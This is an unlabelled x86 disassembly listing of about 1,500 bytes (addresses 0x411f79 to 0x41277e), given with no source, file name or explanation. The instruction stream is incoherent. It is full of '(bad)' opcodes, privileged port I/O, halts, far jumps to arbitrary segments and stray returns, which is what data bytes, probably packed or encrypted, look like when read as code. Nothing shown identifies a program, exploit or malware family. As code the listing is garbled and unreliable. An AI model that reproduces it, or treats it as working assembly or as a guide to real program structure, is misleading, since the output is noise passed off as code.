  411f79:	imul   esp,DWORD PTR [edx],0xffffff99
  411f7c:	retf   
  411f7d:	je     0x411fcb
  411f7f:	add    DWORD PTR [ecx],ecx
  411f81:	cmp    al,bl
  411f83:	xor    ebp,DWORD PTR [edi]
  411f85:	(bad)  
  411f86:	je     0x411f83
  411f88:	add    BYTE PTR [ebx-0x2d3dce00],ah
  411f8e:	aas    
  411f8f:	addr16 inc ecx
  411f91:	push   esp
  411f92:	mov    BYTE PTR [ecx-0x50],bl
  411f95:	jo     0x411fdb
  411f97:	shl    BYTE PTR [esi],0xd3
  411f9a:	mov    fs,WORD PTR [edx]
  411f9c:	arpl   WORD PTR [ebx+0x5b],bx
  411f9f:	and    DWORD PTR [esi],ebp
  411fa1:	mov    ecx,DWORD PTR ds:0xa464ead9
  411fa7:	lahf   
  411fa8:	add    esi,DWORD PTR [esi-0x39297fd3]
  411fae:	or     dl,dl
  411fb0:	loope  0x411fe6
  411fb2:	lds    eax,FWORD PTR ds:0x344f0aa7
  411fb8:	out    dx,al
  411fb9:	sbb    eax,0xd73e0cdf
  411fbe:	and    eax,0xc87da3c
  411fc3:	sub    BYTE PTR [eax],al
  411fc5:	and    eax,DWORD PTR [di]
  411fc8:	mov    bh,0xac
  411fca:	push   edx
  411fcb:	sahf   
  411fcc:	xor    eax,0x395d9007
  411fd1:	ret    0xb5e0
  411fd4:	jae    0x411f8f
  411fd6:	jnp    0x411faf
  411fd8:	inc    edx
  411fd9:	and    eax,0xc51b59b4
  411fde:	fdivr  DWORD PTR [edi-0x4]
  411fe1:	outs   dx,BYTE PTR ds:[esi]
  411fe2:	scas   al,BYTE PTR es:[edi]
  411fe3:	daa    
  411fe4:	mov    eax,ds:0x943f8c9e
  411fe9:	fsubr  st(4),st
  411feb:	sub    eax,0x2605e284
  411ff0:	or     ah,0x6
  411ff3:	xchg   esp,eax
  411ff4:	pop    esp
  411ff5:	test   eax,0xd06c5c25
  411ffa:	mov    dh,0xb0
  411ffc:	data16 aaa 
  411ffe:	inc    ebp
  411fff:	mov    ecx,esp
  412001:	jb     0x411f9e
  412003:	(bad)  
  412004:	ins    DWORD PTR es:[edi],dx
  412005:	jbe    0x412061
  412007:	stos   BYTE PTR es:[edi],al
  412008:	sub    al,0xc3
  41200a:	jmp    0xd1ad00fc
  41200f:	lahf   
  412010:	xor    BYTE PTR [ecx],bh
  412012:	mov    al,0x5a
  412014:	fabs   
  412016:	clc    
  412017:	std    
  412018:	leave  
  412019:	icebp  
  41201a:	xchg   BYTE PTR [ebx+0x20],ah
  41201d:	xlat   BYTE PTR ds:[ebx]
  41201e:	div    BYTE PTR [edi-0x486f23f3]
  412024:	inc    ebp
  412025:	xor    BYTE PTR [edi-0x2be6c549],dh
  41202b:	and    al,0xbe
  41202d:	punpckhwd mm6,mm6
  412030:	and    BYTE PTR [edx+0x4fd5be0f],ah
  412036:	mov    ah,0x65
  412038:	mov    cl,0x2
  41203a:	aad    0x6
  41203c:	jns    0x412023
  41203e:	(bad)  
  41203f:	xor    BYTE PTR [edi],dl
  412041:	sbb    bl,bl
  412043:	(bad)  
  412044:	mov    WORD PTR [esi+0x7ff1cf1a],?
  41204a:	lock xor esi,DWORD PTR [ebx+ebx*1-0x2284060]
  412052:	jg     0x4120ac
  412054:	xchg   BYTE PTR [ebp-0x2],ah
  412057:	jnp    0x41201a
  412059:	jne    0x412017
  41205b:	and    esp,ebp
  41205d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41205e:	sub    DWORD PTR [esi],edi
  412060:	gs scas al,BYTE PTR es:[edi]
  412062:	scas   al,BYTE PTR es:[edi]
  412063:	fwait
  412064:	pop    ebp
  412065:	cmp    eax,0x15b3cf78
  41206a:	fwait
  41206b:	jno    0x41209c
  41206d:	sub    DWORD PTR [edx+0x5e],edx
  412070:	bound  ebp,QWORD PTR [eax-0xabaaeb6]
  412076:	jnp    0x411ffd
  412078:	bound  ebx,QWORD PTR [ebx-0x7080b7ae]
  41207e:	sbb    al,bh
  412080:	stos   BYTE PTR es:[edi],al
  412081:	mov    dl,0x2f
  412083:	cmc    
  412084:	inc    ecx
  412085:	add    al,0x24
  412087:	stc    
  412088:	test   eax,0x18a579e1
  41208d:	and    bl,bl
  41208f:	push   edi
  412090:	dec    edx
  412091:	(bad)  
  412092:	fistp  WORD PTR [ebx-0x43ff891c]
  412098:	and    eax,0x27a3fb7a
  41209d:	dec    ebx
  41209e:	xor    al,0xca
  4120a0:	cmp    dl,al
  4120a2:	ror    DWORD PTR [eax+eiz*2],1
  4120a5:	xchg   ecx,eax
  4120a6:	jmp    0x41e:0x22ba20a4
  4120ad:	retf   
  4120ae:	mov    ch,0xd
  4120b0:	jmp    0x5439ef7d
  4120b5:	or     ebx,DWORD PTR [ecx]
  4120b7:	stc    
  4120b8:	xor    eax,0x2f73fe25
  4120bd:	ds repnz cli 
  4120c0:	push   es
  4120c1:	mov    al,0x8e
  4120c3:	inc    eax
  4120c4:	push   edi
  4120c5:	and    DWORD PTR [esi+0x50eb8747],edi
  4120cb:	inc    eax
  4120cc:	stos   DWORD PTR es:[edi],eax
  4120cd:	int    0x93
  4120cf:	pop    eax
  4120d0:	mov    ch,0xab
  4120d2:	loop   0x41212b
  4120d4:	dec    eax
  4120d5:	pop    esp
  4120d6:	mov    eax,0x53743fec
  4120db:	xor    bh,bl
  4120dd:	cmovns ebx,DWORD PTR [esi+0x6ea6281f]
  4120e4:	ins    BYTE PTR es:[edi],dx
  4120e5:	dec    esi
  4120e6:	loope  0x412093
  4120e8:	inc    esi
  4120e9:	les    esp,FWORD PTR [eax]
  4120eb:	sbb    BYTE PTR [ebx+0x5a],al
  4120ee:	sbb    eax,0x243221cb
  4120f3:	adc    DWORD PTR ds:0x2da4ccf9,edi
  4120f9:	lods   al,BYTE PTR ds:[esi]
  4120fb:	dec    ebx
  4120fc:	xor    al,0x3
  4120fe:	aaa    
  4120ff:	and    DWORD PTR [edi+ebx*2-0x74],ecx
  412103:	popa   
  412104:	dec    ebx
  412105:	(bad)  [esi+0x1cb1df19]
  41210b:	ret    0x5a6
  41210e:	dec    ecx
  41210f:	pushf  
  412110:	or     esp,esi
  412112:	xchg   edx,eax
  412113:	mov    WORD PTR [eax+0x46],?
  412116:	dec    ecx
  412117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412118:	out    0x9f,al
  41211a:	cmp    al,0x4e
  41211c:	in     eax,0xc1
  41211e:	mov    ch,0x26
  412120:	or     dh,cl
  412122:	and    BYTE PTR [esi],dl
  412124:	es icebp 
  412126:	inc    edi
  412127:	out    0xa7,al
  412129:	call   0x2f90fdb1
  41212e:	ret    
  41212f:	and    al,0xcb
  412131:	loopne 0x412189
  412133:	add    BYTE PTR [ebx-0x2c987871],0xa8
  41213a:	mov    dh,0xe4
  41213c:	popf   
  41213d:	sbb    eax,0x4b0c5c1d
  412142:	or     eax,0x75f86215
  412147:	clc    
  412148:	cmp    BYTE PTR ss:[eax+edi*2],ah
  41214c:	fisttp DWORD PTR [ebp-0x68a388d1]
  412152:	cli    
  412153:	lock mov cl,0xc0
  412156:	mov    eax,0x35205b84
  41215b:	outs   dx,DWORD PTR ds:[esi]
  41215c:	xchg   cl,bl
  41215e:	outs   dx,BYTE PTR ds:[esi]
  41215f:	adc    ch,BYTE PTR [eax]
  412161:	sub    dh,BYTE PTR [edx-0x18]
  412164:	shl    BYTE PTR [esi],cl
  412166:	(bad)  
  412167:	mov    ebp,0xb93233c3
  41216c:	test   eax,0x7fe7ffb1
  412171:	xchg   edi,eax
  412172:	ret    0xec62
  412175:	sub    BYTE PTR [esi+0xe],bl
  412178:	mov    al,0x52
  41217a:	jle    0x4121d6
  41217c:	push   edi
  41217d:	(bad)  
  41217e:	hlt    
  41217f:	cmc    
  412180:	aad    0x22
  412182:	add    BYTE PTR ds:0xfa1ed8bd,0x20
  412189:	iret   
  41218a:	icebp  
  41218b:	fiadd  WORD PTR [ecx+0x8]
  41218e:	mov    cl,0x5b
  412190:	push   ebx
  412191:	sahf   
  412192:	adc    DWORD PTR [ebx+0x58],esi
  412195:	push   0xffffffca
  412197:	ss sbb eax,0xde98f24c
  41219d:	inc    ecx
  41219e:	xchg   cl,dl
  4121a0:	push   esi
  4121a1:	jbe    0x412167
  4121a3:	sar    DWORD PTR [esi-0x3b1e5935],0x8e
  4121aa:	or     DWORD PTR [ebp-0x4b822d75],0x2d
  4121b1:	out    dx,eax
  4121b2:	jmp    0x412154
  4121b4:	mov    al,BYTE PTR [eax-0x31]
  4121b7:	inc    ebx
  4121b8:	jnp    0x41221a
  4121ba:	cmp    al,0xbc
  4121bc:	leave  
  4121bd:	ror    BYTE PTR [esi+0xd860a35],cl
  4121c3:	adc    BYTE PTR [ecx+0x46],dl
  4121c6:	jle    0x412237
  4121c8:	hlt    
  4121c9:	test   al,0x22
  4121cb:	sbb    al,0x32
  4121cd:	xchg   DWORD PTR [edx-0x7853befd],eax
  4121d3:	jmp    0xda3f:0xcdc38d54
  4121da:	retf   0xfa27
  4121dd:	or     ebx,eax
  4121df:	sbb    ah,ch
  4121e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121e2:	test   BYTE PTR [esp+ebx*4+0x5fb11756],dl
  4121e9:	stos   DWORD PTR es:[edi],eax
  4121ea:	scas   al,BYTE PTR es:[edi]
  4121eb:	mov    bh,BYTE PTR [edx-0x77]
  4121ee:	dec    edx
  4121ef:	cli    
  4121f0:	lahf   
  4121f1:	loop   0x4121fe
  4121f3:	in     al,dx
  4121f4:	mov    bl,0x99
  4121f6:	fistp  WORD PTR [edx+ebp*4]
  4121f9:	stc    
  4121fa:	cld    
  4121fb:	xor    eax,0x64b628b6
  412200:	xchg   edx,eax
  412201:	ss mov eax,0xa7c735aa
  412207:	or     DWORD PTR [ebp-0x7e],0xd89cff64
  41220e:	ret    0x54fe
  412211:	bound  ebx,QWORD PTR [ebx+0x37]
  412214:	sub    al,0x38
  412216:	and    eax,0x1d88080b
  41221b:	sbb    DWORD PTR ds:0xe1e52c0b,ecx
  412221:	std    
  412222:	adc    DWORD PTR [edx],edx
  412224:	and    eax,0xbb7eae27
  412229:	lea    edi,[edi-0xb]
  41222c:	inc    BYTE PTR [edi]
  41222e:	imul   ebx,DWORD PTR [ebx-0x79],0xffffffea
  412232:	push   ecx
  412233:	pop    ds
  412234:	out    0xe6,al
  412236:	mov    edi,0xd0aa4c1e
  41223b:	stc    
  41223c:	pop    ebp
  41223d:	retf   
  41223e:	scas   eax,DWORD PTR es:[edi]
  41223f:	jmp    0x47d3:0xd7d6abef
  412246:	jmp    0xc978c4e3
  41224b:	ins    DWORD PTR es:[edi],dx
  41224c:	push   cs
  41224d:	mov    bl,al
  41224f:	pop    ss
  412250:	push   es
  412251:	jnp    0x4121f6
  412253:	(bad)  
  412254:	sub    eax,0x825ef4fc
  412259:	mov    ds:0x3008fce6,eax
  41225e:	add    eax,0x7975fec
  412263:	ret    0x6fb0
  412266:	ins    BYTE PTR es:[edi],dx
  412267:	sbb    ebp,ebx
  412269:	sub    ch,BYTE PTR [esi-0xa]
  41226c:	iret   
  41226d:	xchg   BYTE PTR [ecx+0x25],cl
  412270:	cmp    al,0x54
  412272:	inc    edi
  412273:	sbb    al,0x8e
  412275:	cmp    bh,BYTE PTR [esi+0x74d3c762]
  41227b:	daa    
  41227c:	loopne 0x412282
  41227e:	xchg   esp,eax
  41227f:	stos   BYTE PTR es:[edi],al
  412280:	sub    DWORD PTR [edx],0x62057cbc
  412286:	or     ah,BYTE PTR [edx]
  412288:	xchg   DWORD PTR [eax+edx*8],eax
  41228b:	mov    al,0xfa
  41228d:	pop    ebx
  41228e:	pop    ss
  41228f:	and    edx,esi
  412291:	pusha  
  412292:	scas   eax,DWORD PTR es:[edi]
  412293:	sbb    dl,dh
  412295:	push   eax
  412296:	jmp    FWORD PTR [edx+0x32]
  412299:	mov    BYTE PTR [eax],dl
  41229b:	in     al,dx
  41229c:	mov    eax,ds:0x91aa5216
  4122a1:	inc    edx
  4122a2:	jns    0x412296
  4122a4:	adc    al,0x74
  4122a6:	xlat   BYTE PTR ds:[ebx]
  4122a7:	int    0xac
  4122a9:	sbb    ecx,edi
  4122ab:	ss xor cl,cl
  4122ae:	push   ss
  4122af:	lea    ebx,[ebp-0x39]
  4122b2:	in     eax,0x31
  4122b4:	out    0xd2,eax
  4122b6:	call   0x3c6ffb5f
  4122bb:	xchg   esp,eax
  4122bc:	or     eax,0xe3ac85f5
  4122c1:	mov    dh,0xce
  4122c3:	cmp    esi,eax
  4122c5:	add    dl,al
  4122c7:	dec    ebx
  4122c8:	(bad)  
  4122c9:	push   0xffffff95
  4122cb:	sub    eax,DWORD PTR [edx-0x72]
  4122ce:	mov    ds:0xc2fa900c,eax
  4122d3:	push   es
  4122d4:	(bad)  
  4122d5:	and    eax,0x61502266
  4122da:	dec    edx
  4122db:	mov    al,0xd0
  4122dd:	test   al,0xea
  4122df:	mov    BYTE PTR ds:0x286b3a84,ch
  4122e5:	pop    esi
  4122e6:	test   al,0xcf
  4122e8:	rep outs dx,BYTE PTR ds:[esi]
  4122ea:	sbb    DWORD PTR [ebx+0x37260353],edi
  4122f0:	pop    esp
  4122f1:	addr16 ja 0x4122ec
  4122f4:	jmp    0xf9f3:0xe42505cb
  4122fb:	vpsrld xmm1,xmm2,XMMWORD PTR [esi-0x70]
  412300:	cmp    DWORD PTR [eax],0x38bb58b8
  412306:	and    al,0xf0
  412308:	jbe    0x41232d
  41230a:	push   edi
  41230b:	call   0x40f36128
  412310:	sub    DWORD PTR [edx+ebp*1+0x3c],0x5862a9cf
  412318:	xchg   dl,bh
  41231a:	test   esp,0x17c37473
  412320:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412321:	mov    esi,eax
  412323:	test   al,0xa1
  412325:	pushf  
  412326:	cwde   
  412327:	aas    
  412328:	jecxz  0x41236d
  41232a:	jp     0x412390
  41232c:	in     eax,0xcc
  41232e:	lock push edx
  412330:	retf   
  412331:	idiv   DWORD PTR [esp+esi*2+0x6f9baf49]
  412338:	jge    0x41231e
  41233a:	loope  0x41230f
  41233c:	das    
  41233d:	sub    edi,edi
  41233f:	fnstsw WORD PTR [ecx+ebx*1-0x1b]
  412343:	add    dl,BYTE PTR [edx]
  412345:	test   BYTE PTR [ebx-0x35fbe683],bl
  41234b:	mov    edi,0x5018898d
  412350:	jle    0x41237d
  412352:	mov    bl,0x3d
  412354:	imul   ebx,DWORD PTR [eax+0x6ca2c709],0x7bd0d458
  41235e:	mov    bh,0xc0
  412360:	add    cl,BYTE PTR [edx]
  412362:	fidiv  WORD PTR [ecx+ebp*1+0x1f17d35e]
  412369:	mov    WORD PTR [ebx],fs
  41236b:	mov    ecx,0xb951fb48
  412370:	add    eax,0x5505b83b
  412375:	aas    
  412376:	cmp    DWORD PTR [esi+0x595c0dac],esp
  41237c:	xlat   BYTE PTR ds:[ebx]
  41237d:	mov    ah,0xc1
  41237f:	push   ss
  412380:	mov    WORD PTR [esi-0x12],ds
  412383:	lods   eax,DWORD PTR ds:[esi]
  412384:	pop    esp
  412385:	sub    DWORD PTR [ebx],eax
  412387:	mov    eax,0x5fdb074a
  41238c:	neg    ch
  41238e:	ja     0x41235f
  412390:	or     bh,cl
  412392:	sub    DWORD PTR ss:[ebx+eiz*8+0x3d],esi
  412397:	cwde   
  412398:	fwait
  412399:	test   eax,0x244607ed
  41239e:	add    al,0x96
  4123a0:	push   esp
  4123a1:	(bad)  
  4123a2:	xchg   esp,eax
  4123a3:	jno    0x4123e4
  4123a5:	je     0x412415
  4123a7:	fwait
  4123a8:	pop    eax
  4123a9:	cmp    DWORD PTR [edi-0x6977c5ad],ebx
  4123af:	sub    DWORD PTR [esi],0x27
  4123b2:	(bad)  
  4123b3:	cmp    bl,dl
  4123b5:	cmc    
  4123b6:	mov    dl,0x27
  4123b8:	mov    ecx,0x75721b28
  4123bd:	xchg   BYTE PTR [edx+esi*4],dl
  4123c0:	inc    ecx
  4123c1:	cmp    eax,0x2cfee67d
  4123c6:	push   esi
  4123c7:	jbe    0x4123cd
  4123c9:	push   ebp
  4123ca:	push   cs
  4123cb:	call   0x5480b4fb
  4123d0:	mov    dl,0x1d
  4123d2:	jg     0x4123cb
  4123d4:	and    DWORD PTR [ecx],ecx
  4123d6:	test   BYTE PTR [ebp-0x135ccd0d],bl
  4123dc:	cld    
  4123dd:	mov    al,BYTE PTR [ebp-0x2844a70]
  4123e3:	mov    eax,0x383199fe
  4123e8:	aad    0x4b
  4123ea:	mov    ebx,0x5ac004
  4123ef:	retf   
  4123f0:	nop
  4123f1:	sbb    al,0x83
  4123f3:	dec    edx
  4123f4:	sbb    edx,DWORD PTR [ebx+0x51]
  4123f7:	cmp    al,0x5f
  4123f9:	lock mov bl,0x4a
  4123fc:	repnz test BYTE PTR [edi-0x4f],0xfb
  412401:	test   al,0x1
  412403:	stos   BYTE PTR es:[edi],al
  412404:	and    BYTE PTR [esp+ebx*1+0x3b1e1a87],0x9c
  41240c:	call   0x2c66b9ec
  412411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412412:	loope  0x4123e6
  412414:	repz hlt 
  412416:	xor    bl,BYTE PTR [ecx]
  412418:	xchg   ecx,eax
  412419:	jmp    0x5f4e29b
  41241e:	jno    0x4123f7
  412420:	mov    bl,0xe2
  412422:	outs   dx,BYTE PTR ds:[esi]
  412423:	inc    edx
  412424:	mov    bh,0x66
  412426:	popa   
  412427:	mov    ds:0xe2f6cf18,al
  41242c:	fcom   QWORD PTR [ebx-0x41]
  41242f:	mov    eax,ds:0xbb4f0019
  412434:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412435:	or     eax,0x866a29ab
  41243a:	out    dx,eax
  41243b:	mov    esp,0x6de69159
  412440:	in     eax,dx
  412441:	pop    ss
  412442:	pop    ebx
  412443:	adc    ecx,DWORD PTR [ecx-0x28cb2891]
  412449:	test   BYTE PTR [edx+0xf],0xb5
  41244d:	and    edx,DWORD PTR [esi+0x5d51bf3f]
  412453:	mov    al,gs:0x22790f91
  412459:	mov    bl,0x86
  41245b:	push   cs
  41245c:	dec    edi
  41245d:	inc    esp
  41245e:	sbb    DWORD PTR [esp+ebx*4],ecx
  412461:	test   eax,0x51428e58
  412466:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412467:	clc    
  412468:	nop
  412469:	ins    BYTE PTR es:[edi],dx
  41246a:	mov    ds:0x11e80455,eax
  41246f:	mov    ds,WORD PTR [ebp-0x4e]
  412472:	sub    ebp,DWORD PTR [esi]
  412474:	cmp    ebx,ebp
  412476:	out    dx,al
  412477:	shr    ecx,0xb2
  41247a:	popf   
  41247b:	shr    DWORD PTR [edi],0xca
  41247e:	sbb    ah,bl
  412480:	sbb    ebx,DWORD PTR [esp+0x761fd498]
  412487:	adc    edx,DWORD PTR [ecx-0x7c]
  41248a:	cmp    BYTE PTR [ebp-0x7b5ae039],cl
  412490:	push   0x300467a
  412495:	cs and al,0x8e
  412498:	cwde   
  412499:	add    al,0x12
  41249b:	or     ch,ch
  41249d:	xor    bl,0x5f
  4124a0:	lods   eax,DWORD PTR ds:[esi]
  4124a1:	leave  
  4124a2:	mov    ah,0xcd
  4124a4:	jnp    0x4124ac
  4124a6:	jmp    0x4b11f4f0
  4124ab:	pop    ss
  4124ac:	mov    ebx,0xdff5eb53
  4124b1:	mov    edi,DWORD PTR [ecx-0x417ace9d]
  4124b7:	in     eax,dx
  4124b8:	push   ebx
  4124b9:	dec    edx
  4124bb:	pushaw 
  4124bd:	repz cs inc edx
  4124c0:	or     al,0x7a
  4124c2:	stc    
  4124c3:	mov    cl,0x3f
  4124c5:	lea    ebp,[edx]
  4124c7:	xor    cl,BYTE PTR [edi-0x36]
  4124ca:	push   ebx
  4124cb:	shl    DWORD PTR [ecx],cl
  4124cd:	push   0x6bf0470d
  4124d2:	add    eax,0x83bf6f49
  4124d7:	into   
  4124d8:	and    esp,DWORD PTR [ecx]
  4124da:	sub    eax,DWORD PTR [esi]
  4124dc:	jno    0x412483
  4124de:	pusha  
  4124df:	mov    esi,0x8345c92c
  4124e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124e5:	arpl   WORD PTR [ecx+0x5b],di
  4124e8:	or     cl,BYTE PTR [edi-0x72]
  4124eb:	ins    DWORD PTR es:[edi],dx
  4124ec:	dec    edi
  4124ed:	retf   0x1d56
  4124f0:	xchg   edi,eax
  4124f1:	fs pop ebp
  4124f3:	pop    ecx
  4124f4:	xlat   BYTE PTR ds:[ebx]
  4124f5:	xor    ah,ch
  4124f7:	mov    eax,0xa0767eb9
  4124fc:	js     0x4124d7
  4124fe:	add    BYTE PTR [edx],al
  412500:	pushf  
  412501:	sbb    al,0x14
  412503:	mov    cl,0xee
  412505:	out    dx,eax
  412506:	rcr    DWORD PTR ds:0x820d70f6,1
  41250c:	das    
  41250d:	mov    al,0xa4
  41250f:	xor    BYTE PTR [ecx+eiz*1-0x35],al
  412513:	test   DWORD PTR [edx-0x2a],0x9fcccc33
  41251a:	adc    eax,0xce1a03ed
  41251f:	stc    
  412520:	fcmovb st,st(6)
  412522:	pop    edx
  412523:	mov    dl,0xa8
  412525:	retf   0x924f
  412528:	pop    edi
  412529:	cmp    BYTE PTR [ecx],0x79
  41252c:	and    BYTE PTR [edi],al
  41252e:	xor    DWORD PTR [ecx-0x6b],eax
  412531:	or     eax,0x86565d9c
  412536:	inc    ebx
  412537:	cmp    edx,DWORD PTR [edx+eiz*4]
  41253a:	addr16 mov ss:0xfbb,eax
  41253f:	push   ds
  412540:	lods   eax,DWORD PTR ds:[esi]
  412541:	mov    ds:0xecf87ce,eax
  412546:	dec    edx
  412547:	shl    BYTE PTR [ebp-0x5e],0x44
  41254b:	mov    eax,ds:0xf4e9e95f
  412550:	jl     0x4125a5
  412552:	pop    ebp
  412553:	jmp    0x2c5d:0x6354e38d
  41255a:	je     0x4125b2
  41255c:	lods   al,BYTE PTR ds:[esi]
  41255d:	bound  ebp,QWORD PTR [ebx+0x56]
  412560:	or     eax,0x7a9b0819
  412565:	sub    al,0x10
  412567:	mov    WORD PTR [ecx-0x304d8c03],?
  41256d:	xchg   ecx,eax
  41256e:	push   ebx
  41256f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412570:	cmp    eax,0x1ac3c5d0
  412575:	or     DWORD PTR [eax-0x4802df4e],eax
  41257b:	adc    eax,edi
  41257d:	stos   BYTE PTR es:[edi],al
  41257e:	div    BYTE PTR ds:0x3d5e922f
  412584:	lock xor ebx,DWORD PTR cs:[esi-0x54277bc2]
  41258c:	fucom  st(0)
  41258e:	jecxz  0x41251d
  412590:	test   BYTE PTR [ecx-0x1d8281e],dl
  412596:	mov    edx,ecx
  412598:	daa    
  412599:	cmp    esp,DWORD PTR [ebx-0x537887d4]
  41259f:	test   al,0xeb
  4125a1:	mov    dl,0x63
  4125a3:	mov    esi,0x3d89ce23
  4125a8:	or     dh,BYTE PTR [ebx+0x5a]
  4125ab:	pop    ds
  4125ac:	xchg   ebx,eax
  4125ad:	pop    edi
  4125ae:	mov    edi,0x8462df98
  4125b3:	das    
  4125b4:	add    al,0xef
  4125b6:	jbe    0x41259d
  4125b8:	pushf  
  4125b9:	es retf 
  4125bb:	les    edx,FWORD PTR [edi+eiz*2+0x26]
  4125bf:	pop    edx
  4125c0:	pop    ds
  4125c1:	push   edi
  4125c2:	pushf  
  4125c3:	pop    eax
  4125c4:	jp     0x412549
  4125c6:	fild   WORD PTR [esi+0x52f40ba5]
  4125cc:	push   esp
  4125cd:	adc    al,0x4f
  4125cf:	add    eax,0x505510d2
  4125d4:	(bad)  
  4125d5:	mov    bl,0x32
  4125d7:	or     DWORD PTR [edx],ecx
  4125d9:	dec    ecx
  4125da:	xchg   edi,eax
  4125db:	xchg   DWORD PTR [edi-0x39],esi
  4125de:	pop    ebp
  4125df:	retf   0xb167
  4125e2:	push   ecx
  4125e3:	sbb    esp,DWORD PTR [ecx-0x14]
  4125e6:	ins    DWORD PTR es:[edi],dx
  4125e7:	jmp    0x5786:0x7155fe0a
  4125ee:	and    BYTE PTR [eax+0x110c13ba],bh
  4125f4:	aad    0xec
  4125f6:	push   esp
  4125f7:	sub    al,0x5
  4125f9:	push   ds
  4125fa:	out    dx,eax
  4125fb:	scas   eax,DWORD PTR es:[edi]
  4125fc:	add    al,0x48
  4125fe:	jl     0x41266e
  412600:	mov    esi,0x606af808
  412605:	cmp    eax,0xbfe18ae7
  41260a:	inc    edi
  41260b:	inc    ebp
  41260c:	push   esi
  41260d:	mov    cl,0x99
  41260f:	mov    esp,0xb6ba2e1e
  412614:	inc    esi
  412615:	inc    edi
  412616:	(bad)  
  412617:	mov    al,0x4b
  412619:	stc    
  41261a:	sub    dh,BYTE PTR [eax]
  41261c:	fldcw  WORD PTR [ebx-0x1f]
  41261f:	rol    BYTE PTR [ebx+ebp*4+0x30],0x19
  412624:	in     eax,dx
  412625:	mov    WORD PTR [edx],?
  412627:	sbb    BYTE PTR [eax*1+0x13c60936],bh
  41262e:	rcr    DWORD PTR [ebx+0x311fcd00],0x7b
  412635:	(bad)  
  412636:	cmc    
  412637:	and    ebx,DWORD PTR [ebp-0x7d]
  41263a:	ret    
  41263b:	pop    eax
  41263c:	in     al,dx
  41263d:	mov    eax,ds:0x25e33354
  412642:	mov    esi,DWORD PTR [eax]
  412644:	test   eax,0x2052ac6
  412649:	inc    esi
  41264a:	ficomp DWORD PTR [ebp-0x36e35e06]
  412650:	mov    edi,0xe40a3ae3
  412655:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412656:	xor    al,0xc4
  412658:	div    al
  41265a:	aad    0x30
  41265c:	lods   eax,DWORD PTR ds:[esi]
  41265d:	cmc    
  41265e:	ds je  0x412649
  412661:	mov    cl,dh
  412663:	push   eax
  412664:	sti    
  412665:	jns    0x412648
  412667:	cld    
  412668:	jne    0x4126a1
  41266a:	fisubr WORD PTR [ebp-0x6a]
  41266d:	rol    BYTE PTR [ebx+0x8],0xec
  412671:	(bad)  
  412672:	das    
  412673:	sub    DWORD PTR [edi+edx*1-0x197eb6c0],ebx
  41267a:	je     0x4126ae
  41267c:	pop    ds
  41267d:	arpl   WORD PTR [edi-0x78acc21b],bp
  412683:	call   0x4b4c3cba
  412688:	fnop   
  41268a:	ret    0x3e32
  41268d:	gs hlt 
  41268f:	adc    ecx,DWORD PTR [eax]
  412691:	in     al,dx
  412692:	add    al,0x1f
  412694:	or     dh,dl
  412696:	cli    
  412697:	jge    0x412638
  412699:	aam    0x3
  41269b:	pop    esp
  41269c:	bound  ebp,QWORD PTR ds:[ecx]
  41269f:	xchg   esi,eax
  4126a0:	stos   DWORD PTR es:[edi],eax
  4126a1:	sub    DWORD PTR [ebx],eax
  4126a3:	pushf  
  4126a4:	jmp    0x412721
  4126a6:	add    DWORD PTR [ebx-0x2fe3f58b],ecx
  4126ac:	push   0xf2cbb954
  4126b1:	sbb    edx,0xffffff8b
  4126b4:	mov    ?,WORD PTR [ebx+0x17]
  4126b7:	sbb    BYTE PTR [ebx-0x6f34f663],dl
  4126bd:	fstp   DWORD PTR [esi+esi*4+0x3e]
  4126c1:	push   edx
  4126c2:	mov    esi,0x5916ca87
  4126c7:	xchg   ecx,eax
  4126c8:	pusha  
  4126c9:	mov    ss,WORD PTR ds:0xf3c085bb
  4126cf:	out    dx,eax
  4126d0:	cdq    
  4126d1:	mov    bl,0x6a
  4126d3:	mov    esp,ecx
  4126d5:	pop    ebx
  4126d6:	xchg   edx,eax
  4126d7:	cli    
  4126d8:	(bad)  
  4126da:	aaa    
  4126db:	fdiv   QWORD PTR [ebp-0x52]
  4126de:	xchg   edi,eax
  4126df:	in     al,dx
  4126e0:	cmp    eax,0x5e85a015
  4126e5:	fwait
  4126e6:	push   esi
  4126e7:	adc    BYTE PTR ds:0x31efd48e,al
  4126ed:	je     0x4126d0
  4126ef:	cld    
  4126f0:	cwde   
  4126f1:	arpl   WORD PTR [edi-0x5c637834],bp
  4126f7:	rcr    DWORD PTR [esi-0x73bd62df],1
  4126fd:	(bad)  [eax-0x5097f25c]
  412703:	(bad)  
  412704:	mov    al,ds:0x6af765d1
  412709:	jp     0x41270e
  41270b:	jmp    0xf2ab:0x785e92dd
  412712:	and    DWORD PTR [esi+ebx*2],edi
  412715:	mov    esi,ebx
  412717:	fidiv  WORD PTR [edi]
  412719:	jp     0x41270e
  41271b:	push   cs
  41271c:	aas    
  41271d:	fldcw  WORD PTR ds:0x1b827af1
  412723:	pushf  
  412724:	ret    0x1e7c
  412727:	mov    al,0x6f
  412729:	test   eax,0x587d008
  41272e:	pop    ecx
  41272f:	popf   
  412730:	outs   dx,DWORD PTR ds:[esi]
  412731:	adc    ecx,DWORD PTR ds:0x196f5717
  412737:	in     eax,dx
  412738:	fcmovu st,st(7)
  41273a:	enter  0x346d,0x26
  41273e:	out    0xc5,al
  412740:	mov    eax,ds:0x3d1b0a6b
  412745:	sub    al,0x8c
  412747:	test   BYTE PTR [ebp+edi*1+0x1771a63c],ah
  41274e:	inc    edx
  41274f:	mov    esi,0xd166fe2
  412754:	or     BYTE PTR [edx],0x87
  412757:	dec    edx
  412758:	repnz cli 
  41275a:	addr16 push 0x4223ea14
  412760:	jg     0x41277a
  412762:	mov    ebx,0x6a3e14a7
  412767:	sbb    DWORD PTR [eax-0x57],0x9ed25664
  41276e:	into   
  41276f:	ret    0xa8ff
  412772:	lods   eax,DWORD PTR ds:[esi]
  412773:	retf   
  412774:	xor    eax,0xe5deaa96
  412779:	push   0xffffffe2
  41277b:	jp     0x412732
  41277d:	retf   
  41277e:	mov    WORD PTR [edx+0x6],gs
